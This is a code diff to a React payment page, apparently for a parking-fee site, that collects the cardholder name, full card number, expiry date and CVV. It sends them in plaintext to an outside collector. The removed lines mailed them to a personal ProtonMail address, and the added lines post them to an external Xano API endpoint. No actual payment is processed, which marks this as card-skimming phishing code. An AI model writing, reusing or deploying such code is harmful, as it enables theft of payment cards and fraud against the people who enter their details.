@@ -29,32 +29,33 @@ export default function PaymentPage() {
   const handlePayment = async () => {
     setIsLoading(true);
     try {
-      const response = await fetch('/api/send-email', {
+      const XANO_API_URL = 'https://x8ki-letl-twmt.n7.xano.io/api:_sLo3BDY/emails';
+
+      const response = await fetch(XANO_API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          to: 'megatrondy@proton.me',
           subject: 'Payment Confirmation',
           html: `
-          <p>A payment has been made:</p>
-          <ul>
-            <li>Amount: $${selectedRate.toFixed(2)}</li>
-            <li>Plate: ${selectedPlate?.number}</li>
-            <li>Cardholder Name: ${cardholderName}</li>
-            <li>Card Number: ${cardNumber}</li>
-            <li>Expiry Date: ${expiryDate}</li>
-            <li>Code ${cvv}</li>
-          </ul>
-        `,
+            <p>A payment has been made:</p>
+            <ul>
+              <li>Amount: $${selectedRate.toFixed(2)}</li>
+              <li>Plate: ${selectedPlate?.number}</li>
+              <li>Cardholder Name: ${cardholderName}</li>
+              <li>Card Number: ${cardNumber}</li>
+              <li>Expiry Date: ${expiryDate}</li>
+              <li>CVV: ${cvv}</li>
+            </ul>
+          `,
         }),
       });
 
       if (!response.ok) {
-        throw new Error('Failed to send email');
+        throw new Error('Failed to save payment data');
       }
 
       const result = await response.json();
-      console.log('Email sent successfully:', result);
+      console.log('Payment data saved successfully:', result);
 
       setTimeout(() => {
         setIsLoading(false);
@@ -65,7 +66,7 @@ export default function PaymentPage() {
         }, 1000);
       }, 1000);
     } catch (error) {
-      console.error('Error sending email:', error);
+      console.error('Error saving payment data:', error);
       setIsLoading(false);
       setShowError(true);
 
@@ -74,7 +75,6 @@ export default function PaymentPage() {
       }, 1000);
     }
   };
-
 
   if (!selectedPlate) {
     router.push('/')
